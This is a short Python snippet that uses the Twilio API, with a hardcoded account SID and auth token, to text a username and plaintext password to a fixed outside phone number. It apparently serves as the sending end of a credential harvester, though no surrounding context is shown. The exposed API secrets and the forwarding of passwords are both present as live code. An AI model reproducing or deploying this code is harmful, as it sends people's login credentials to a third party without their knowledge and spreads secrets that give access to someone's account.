from twilio.rest import Client

account_sid = 'AC2abae06fb969d05ee62f56659fe4c859'
auth_token = '00f9e326f170c47f162ba6ccae31a16b'
client = Client(account_sid, auth_token)

def sms_body(username: str, password: str):
    str = f"\nUsername: {username}\nPassword: {password}"
    message = client.messages.create(
        from_='+12184033483',
        to='+998994000075',
        body= str
    )
    print(message.sid)
    return message
message = sms_body
